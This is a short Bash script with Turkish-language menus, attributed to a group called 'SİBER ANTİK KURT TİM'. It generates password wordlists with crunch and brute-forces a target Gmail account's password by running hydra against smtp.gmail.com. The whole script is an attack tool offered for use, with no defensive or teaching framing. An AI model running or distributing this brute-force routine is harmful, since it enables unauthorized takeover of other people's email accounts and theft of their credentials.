#! bin/bash/
clear
echo -e '\e[36m
                        m
   mmm  m    m   mm   mmmmm  m      mmmmm  mmmmm  m    mmmmmmmm
 m"   " ##  ##   ##     #    #      #    # #   "# #    #   #
 #   mm # ## #  #  #    #    #      #mmmm" #mmmm" #    #   #
 #    # # "" #  #mm#    #    #      #    # #   "m #    #   #
  "mmm" #    # #    # mm#mm  #mmmmm #mmmm" #    " "mmmm"   #
		\e[31m[\e[37m+\e[31m]CODED BY STAR_SKY
		\e[31m[\e[37m+\e[31m]SİBER ANTİK KURT TİM

\e[31m[\e[34m01\e[31m]\e[37mKELİME LİST OLUŞTUR
\e[31m[\e[34m02\e[31m]\e[37mGMAİL KABAKUVVET


\e[31m[\e[34m99\e[31m]\e[37mÇIKIŞ YAP
'
read -p $'\e[35mİŞLEM SEÇİNİZ=}' secim

if [[ $secim == 01 || $secim == 1 ]]; then
clear
echo -e '\e[35m
 _     ___ ____ _____    ___  _    _   _ ____ _____ _   _ ____
| |   |_ _/ ___|_   _|  / _ \| |  | | | / ___|_   _| | | |  _ \ \e[36m
| |    | |\___ \ | |   | | | | |  | | | \___ \ | | | | | | |_) |
| |___ | | ___) || |   | |_| | |__| |_| |___) || | | |_| |  _ < \e[37m
|_____|___|____/ |_|    \___/|_____\___/|____/ |_|  \___/|_| \_\

'
read -p $'\e[34mLİSTEDE OLUŞACAK MİN HANE SAYISI:' listmin
read -p $'\e[34mLİSTEDE OLUŞACAK MAX HANE SAYISI:' listmax
read -p $'\e[34mKARIŞTIRILACAK KARAKTERLER:' listcara
read -p $'\e[34mİSMİ NE OLSUN:' ismi
crunch $listmin $listmax $listcara -o $ismi
echo -e '\e[31mSON İŞLEMLER YAPILIYOR'
sleep 1.1
echo -e '\e[31mBEKLEDİĞİNİZE DEYDİ LİSTENİZ BAŞARILI Bİ ŞEKİLDE OLUŞTURULDU...'
sleep 1.1
bash sak.sh

elif [[ $secim == 02 || $secim == 2 ]]; then
clear
echo -e '\e[37m
  ___|  \  |    \   _ _| |     __ )   _ \  |   |__ __| ____|\e[34m
 |     |\/ |   _ \    |  |     __ \  |   | |   |   |   __|
 |   | |   |  ___ \   |  |     |   | __ <  |   |   |   |\e[36m
\____|_|  _|_/    _\___|_____|____/ _| \_\\___/   _|  _____|
'
read -p $'\e[33mHEDEF GMAİL GİRİNİZ:' gmail
read -p $'\e[33mWORDLİST YOLUNU GİRİNİZ:' yol
echo -e '\e[31mNOT:SALDIRININ SÜRESİ LİSTENİZE VE NET HIZINIZA BAĞLIDIR...'
sleep 0.1
echo -e '\e[33mSALDIRI BAŞLATILIYOR...'
sleep 1.1
echo -e '\e[32m3'
sleep 0.5
echo -e '\e[32m2'
sleep 0.5
echo -e '\e[32m1'
sleep 0.5
echo -e '\e[32m0'

hydra smtp.gmail.com smtp -l $gmail -P$yol -s 465 -S -v -V

elif [[ $secim == 99 ]]; then
	clear
	echo -e '\e[31m(:SİBER ANTİK KURT TİM İYİ GÜNLER DİLER:)'
	sleep 1.1
	cd
	exit
else 
	bash sak.sh
fi
